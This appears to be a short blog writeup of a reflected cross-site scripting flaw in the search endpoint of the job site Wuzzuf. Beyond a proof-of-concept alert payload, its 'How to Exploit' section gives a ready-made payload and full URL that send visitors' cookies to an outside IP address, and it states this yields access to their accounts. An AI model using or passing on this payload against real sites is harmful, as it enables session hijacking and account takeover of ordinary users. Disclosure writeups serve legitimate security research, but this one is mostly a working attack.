---
layout: single
title: "Cross Site Scriping (XSS) on Wuzzuf"
header:
  overlay_image: blog-cover.png
---

## Vulnerability Writeup

Affected Endpoint: ```https://wuzzuf.net/search/jobs?q=```

Used Payload: ```<img src=x onerror=alert(document.cookie)>```

Full Request ```https://wuzzuf.net/search/jobs?q=<img src=x onerror=alert(document.cookie)>```

<p align="center"><a href="/images/wuzzuf1.png"><img src="/images/wuzzuf1.png"></a></p>

<p align="center"><a href="/images/wuzzuf2.png"><img src="/images/wuzzuf2.png"></a></p>

## How to Exploit

Malicious Payload: ```</title><img%20src=x%20onerror='location.href="http://http://156.218.18.188:8080/exploit?cook="%2bdocument.cookie;'>```

Full Malicious Request: ```https://wuzzuf.net/search/jobs?q=</title><img%20src=x%20onerror='location.href="http://156.218.18.188:8080/exploit?cook="%2bdocument.cookie;'>```

When wuzzuf users visit this url, the malicious attacker will have their cookies and can access their accounts.

<p align="center"><a href="/images/wuzzuf3.jpg"><img src="/images/wuzzuf3.jpg"></a></p>

